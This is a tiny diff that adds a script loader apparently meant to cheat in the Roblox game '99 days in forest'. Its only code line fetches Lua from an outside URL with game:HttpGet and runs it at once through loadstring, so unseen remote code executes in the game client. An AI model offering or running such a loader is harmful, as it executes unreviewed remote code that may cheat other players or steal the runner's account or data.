@@ -1,0 +1,2 @@
+-- 99 days in forest 
+loadstring(game:HttpGet("https://cdn.authguard.org/virtual-file/c7ab3565d82e49bfa15353e057488e63"))()
